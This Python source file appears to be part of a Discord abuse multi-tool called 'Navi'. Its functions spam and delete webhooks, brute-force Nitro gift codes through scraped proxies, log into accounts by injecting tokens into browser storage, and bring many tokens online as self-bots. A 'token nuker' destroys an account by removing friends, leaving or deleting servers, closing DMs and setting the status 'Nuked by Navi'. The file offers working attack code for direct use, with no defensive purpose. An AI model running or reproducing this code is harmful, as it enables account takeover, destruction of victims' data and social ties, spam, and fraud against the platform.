import time, urllib.request, urllib.error, urllib.parse, json, requests, random, string, threading, webbrowser, os, concurrent.futures
from datetime import datetime, timezone
from core.display import Colors, Colorate, get_inpt, Theme

def _snd(url, d, m='POST'):
    try:
        _d = json.dumps(d).encode('utf-8') if d else b''
        r = urllib.request.Request(url, data=(_d if m=='POST' else None), method=m)
        r.add_header('User-Agent', 'Navi_Wired/1.0')
        r.add_header('Content-Type', 'application/json')
        with urllib.request.urlopen(r) as rs: return rs.status
    except: return -1

def webhook_spam(url, msg, amt=10):
    cl = Theme.get_colors()
    print("\n  [+] Initializing spam...") 
    sc, p = 0, {"content": msg, "username": "Navi@WIRED", "avatar_url": "https://i.ibb.co/Wv94YGVx/navi.png"}
    for i in range(amt):
        st = _snd(url, p)
        if st in [200, 204]:
            print(Colorate.Horizontal(cl["head"], f"  [>] Sent {i+1}/{amt}"))
            sc += 1
        else: print(Colorate.Horizontal(cl["num"], f"  [!] Failed {i+1}"))
        time.sleep(0.15) 
    print(Colorate.Horizontal(cl["head"], f"\n  [=] Done: {sc} hits."))
    input("  Press enter...")

def webhook_delete(url):
    cl = Theme.get_colors()
    print("\n  [+] Deleting hook...")
    res = _snd(url, {}, m='DELETE')
    if res in [200, 204]: print(Colorate.Horizontal(cl["head"], "  [>] Erased."))
    else: print(Colorate.Horizontal(cl["num"], "  [!] Error deleting."))
    input("  Press enter...")

def id_to_token(uid):
    import base64
    try: return base64.b64encode(str(uid).encode()).decode()
    except: return "???"

def server_info_lookup(inv):
    cl = Theme.get_colors()
    print(Colorate.Horizontal(cl["head"], "  [+] Fetching server..."))
    try:
        c = inv.split("/")[-1] if "/" in inv else inv
        r = requests.get(f"https://discord.com/api/v9/invites/{c}")
        if r.status_code == 200:
            d = r.json()
            g = d.get("guild", {})
            print(Colorate.Horizontal(cl["num"], "  [=] Name: ") + Colorate.Horizontal(cl["txt"], str(g.get("name"))))
            print(Colorate.Horizontal(cl["num"], "  [=] ID: ") + Colorate.Horizontal(cl["txt"], str(g.get("id"))))
            if "inviter" in d:
                i = d["inviter"]
                print(Colorate.Horizontal(cl["num"], "  [=] Inviter: ") + Colorate.Horizontal(cl["txt"], f"{i.get('username')} ({i.get('id')})"))
        else: print(Colorate.Horizontal(cl["num"], "  [!] Invalid invite."))
    except: print(Colorate.Horizontal(cl["num"], "  [!] Error."))
    input(Colorate.Horizontal(cl["head"], "\n  Press Enter..."))

def nitro_generator(tc=1):
    cl, lock = Theme.get_colors(), threading.Lock()
    pxs = []
    print(Colorate.Horizontal(cl["head"], f"  [+] Nitro Gen starting ({tc} threads)..."))
    _u = get_inpt("Use proxies? (y/n):").lower() == 'y'
    if _u:
        _srcs = ["https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=yes&anonymity=all", "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"]
        for s in _srcs:
            try:
                r = requests.get(s, timeout=5)
                if r.status_code == 200:
                    for l in r.text.splitlines():
                        if ":" in l: pxs.append(l.strip())
            except: pass
        pxs = list(set(pxs))
    wh = get_inpt("Webhook for hits (Enter to skip):")
    st = {"v": 0, "i": 0, "r": 0, "e": 0}
    def _chk():
        while True:
            c = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(16))
            url = f'https://discord.gift/{c}'
            p = random.choice(pxs) if _u and pxs else None
            prox = {"http": f"http://{p}", "https": f"http://{p}"} if p else None
            try:
                r = requests.get(f'https://discordapp.com/api/v6/entitlements/gift-codes/{c}?with_application=false&with_subscription_plan=true', proxies=prox, timeout=7)
                with lock:
                    if r.status_code == 200:
                        st["v"] += 1; print(f"\n  [$$$] VALID: {url}")
                        with open("hits.txt", "a") as f: f.write(f"{url}\n")
                        if wh: requests.post(wh, json={'content': f"Nitro Valid! {url}"})
                    elif r.status_code == 429: st["r"] += 1
                    elif r.status_code == 404: st["i"] += 1
                    else: st["e"] += 1
            except: st["e"] += 1
            with lock: print(Colorate.Horizontal(cl["txt"], f"  [~] Hits: {st['v']} | Invalid: {st['i']} | 429s: {st['r']} | Errors: {st['e']}      "), end="\r")
            if not _u: time.sleep(1)
    try:
        for _ in range(tc): threading.Thread(target=_chk, daemon=True).start()
        while True: time.sleep(1)
    except: input(Colorate.Horizontal(cl["head"], "\n  Press Enter..."))

def bot_invite_gen(bid):
    cl = Theme.get_colors()
    l = f"https://discord.com/oauth2/authorize?client_id={bid}&scope=bot&permissions=8"
    print(Colorate.Horizontal(cl["head"], f"  [>] Link: {l}"))
    if input(Colorate.Horizontal(cl["num"], "  Open? (y/n): ")).lower() == 'y': webbrowser.open(l)
    input(Colorate.Horizontal(cl["head"], "\n  Press Enter..."))

def token_info(tk):
    cl = Theme.get_colors()
    print(Colorate.Horizontal(cl["head"], "  [+] Fetching account..."))
    h = {"Authorization": tk, "Content-Type": "application/json"}
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=h)
        if r.status_code != 200:
            print(Colorate.Horizontal(cl["num"], "  [!] Invalid Token."))
            return
        j = r.json()
        un = f"{j.get('username')}#{j.get('discriminator')}"
        nit = {1:"Classic",2:"Boost",3:"Basic"}.get(j.get("premium_type", 0), "None")
        ln = "  " + "─" * 50
        print(Colorate.Horizontal(cl["head"], ln))
        for k, v in [("User",un),("ID",j.get("id")),("Email",j.get("email","N/A")),("Phone",j.get("phone","N/A")),("Nitro",nit)]:
            print(Colorate.Horizontal(cl["num"], f"  [>] {k:<10}: ") + Colorate.Horizontal(cl["txt"], str(v)))
        print(Colorate.Horizontal(cl["main"], ln))
    except: print(Colorate.Horizontal(cl["num"], "  [!] Failed."))
    input(Colorate.Horizontal(cl["head"], "\n  Press Enter..."))

def token_login(tk):
    cl = Theme.get_colors()
    print(Colorate.Horizontal(cl["head"], "  [+] Initializing automated login via ChromeDriver..."))
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.service import Service
        from webdriver_manager.chrome import ChromeDriverManager
        
        print(Colorate.Horizontal(cl["num"], "  [>] Starting Chrome..."))
        opts = webdriver.ChromeOptions()
        opts.add_experimental_option("detach", True)
        opts.add_argument("--log-level=3")
        
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)
        driver.get("https://discord.com/login")
        
        print(Colorate.Horizontal(cl["num"], "  [>] Injecting token..."))
        script = f"""
            function login(token) {{
                setInterval(() => {{
                    document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${{token}}"`
                }}, 50);
                setTimeout(() => {{
                    location.reload();
                }}, 2500);
            }}
            login("{tk}")
        """
        driver.execute_script(script)
        print(Colorate.Horizontal(cl["head"], "  [=] Login successful. Browser window is active."))
    except Exception as e:
        print(Colorate.Horizontal(cl["num"], f"  [!] Automated login failed: {e}"))
        print(Colorate.Horizontal(cl["txt"], "  [~] Falling back to manual method..."))
        script = """
        function login(token) {
            setInterval(() => {
                document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
                location.reload();
            }, 2500);
        }
        """
        print(Colorate.Horizontal(cl["num"], "  [!] MANUAL INSTRUCTIONS:"))
        print(Colorate.Horizontal(cl["txt"], "  1. Open Discord in your browser."))
        print(Colorate.Horizontal(cl["txt"], "  2. Press F12 to open Developer Tools."))
        print(Colorate.Horizontal(cl["txt"], "  3. Go to the 'Console' tab."))
        print(Colorate.Horizontal(cl["txt"], "  4. Paste the following command and press Enter:\n"))
        print(Colorate.Horizontal(cl["head"], f"  login(\"{tk}\")"))
        print(f"\n  {script}")
        webbrowser.open("https://discord.com/login")
    
    input(Colorate.Horizontal(cl["head"], "\n  Press Enter once done..."))

def token_nuker(tk):
    cl = Theme.get_colors()
    print(Colorate.Horizontal(cl["num"], "  [!] WARNING: This will destroy the account. Continue? (y/n)"))
    if get_inpt(">").lower() != 'y': return
    h = {"Authorization": tk}
    print(Colorate.Horizontal(cl["head"], "  [+] Nuke started (Chaos Mode Enabled)..."))
    
    _active = True

    def _log_nuke(m, success=True, warn=False):
        col = cl["head"] if success else (cl["num"] if warn else cl["num"])
        sym = "+" if success else ("!" if not warn else "~")
        print(Colorate.Horizontal(col, f"  [{sym}] {m}"))

    def _req(m, url, d=None, msg="Action", retries=3):
        for _ in range(retries):
            try:
                r = requests.request(m, url, headers=h, json=d, timeout=10)
                if r.status_code in [200, 201, 204]:
                    if msg: _log_nuke(msg)
                    return True
                elif r.status_code == 429:
                    _wait = r.json().get("retry_after", 1.5)
                    time.sleep(_wait)
                else:
                    if msg: _log_nuke(f"Failed ({r.status_code}): {msg}", False)
                    return False
            except:
                time.sleep(1)
        if msg: _log_nuke(f"Error: {msg}", False)
        return False

    def _flicker():
        locales = ["ja", "zh-TW", "ko", "en-US"]
        themes = ["light", "dark"]
        while _active:
            _req("PATCH", "https://discord.com/api/v9/users/@me/settings", {"theme": random.choice(themes), "locale": random.choice(locales)}, msg=None)
            time.sleep(0.5)

    def _run():
        nonlocal _active
        # Start flickering in background
        threading.Thread(target=_flicker, daemon=True).start()
        _log_nuke("Chaos Flicker started.")

        print(Colorate.Horizontal(cl["head"], "\n  [ PHASE 1 ] Removing Friends..."))
        try:
            fs = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=h).json()
            if isinstance(fs, list):
                with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
                    futures = [ex.submit(_req, "DELETE", f"https://discord.com/api/v9/users/@me/relationships/{f['id']}", msg=f"Removed Friend: {f.get('user',{}).get('username','Unknown')}") for f in fs]
                    concurrent.futures.wait(futures)
        except: pass

        print(Colorate.Horizontal(cl["head"], "\n  [ PHASE 2 ] Leaving/Deleting Guilds..."))
        try:
            gs = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=h).json()
            if isinstance(gs, list):
                with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
                    futures = []
                    for g in gs:
                        is_owner = g.get("owner", False)
                        url = f"https://discord.com/api/v9/guilds/{g['id']}" if is_owner else f"https://discord.com/api/v9/users/@me/guilds/{g['id']}"
                        type_str = "Deleted" if is_owner else "Left"
                        futures.append(ex.submit(_req, "DELETE", url, msg=f"{type_str} Guild: {g.get('name','Unknown')}"))
                    concurrent.futures.wait(futures)
        except: pass

        print(Colorate.Horizontal(cl["head"], "\n  [ PHASE 3 ] Closing DMs..."))
        try:
            cs = requests.get("https://discord.com/api/v9/users/@me/channels", headers=h).json()
            if isinstance(cs, list):
                with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
                    futures = [ex.submit(_req, "DELETE", f"https://discord.com/api/v9/channels/{c['id']}", msg=f"Closed DM: {c.get('id')}") for c in cs]
                    concurrent.futures.wait(futures)
        except: pass

        _active = False # Stop flickering
        time.sleep(1)
        print(Colorate.Horizontal(cl["head"], "\n  [ PHASE 4 ] Finalizing..."))
        _req("PATCH", "https://discord.com/api/v9/users/@me/settings", {"theme": "light", "locale": "ja", "custom_status": {"text": "Nuked by Navi"}}, "Set Final White/JP Mode")
        
        print(Colorate.Horizontal(cl["head"], "\n  [=] Nuke completed successfully."))
        input("  Press Enter...")

    threading.Thread(target=_run).start()
    print(Colorate.Horizontal(cl["head"], "  [>] Nuke in progress..."))
    input("  Press Enter...")

def token_rotator(tk):
    cl = Theme.get_colors()
    st = get_inpt("Statuses (sep by comma):").split(",")
    print(Colorate.Horizontal(cl["head"], "  [+] Rotating status... (Ctrl+C to stop)"))
    try:
        while True:
            for s in st:
                requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"Authorization": tk}, json={"custom_status": {"text": s.strip()}})
                time.sleep(5)
    except: pass

def token_onliner():
    cl = Theme.get_colors()
    if not os.path.exists("input/tokens.txt"):
        print(Colorate.Horizontal(cl["num"], "  [!] input/tokens.txt not found."))
        return
    with open("input/tokens.txt", "r") as f: tks = [l.strip() for l in f if l.strip()]
    print(Colorate.Horizontal(cl["head"], f"  [+] Onlining {len(tks)} tokens..."))
    def _online(tk):
        import websocket
        try:
            ws = websocket.WebSocket()
            ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
            ws.send(json.dumps({"op": 2, "d": {"token": tk, "properties": {"$os": "windows", "$browser": "chrome", "$device": "pc"}}}))
            while True:
                ws.send(json.dumps({"op": 1, "d": None}))
                time.sleep(30)
        except: pass
    for t in tks: threading.Thread(target=_online, args=(t,), daemon=True).start()
    input(Colorate.Horizontal(cl["head"], "  [>] Tokens are online. Press Enter to stop..."))
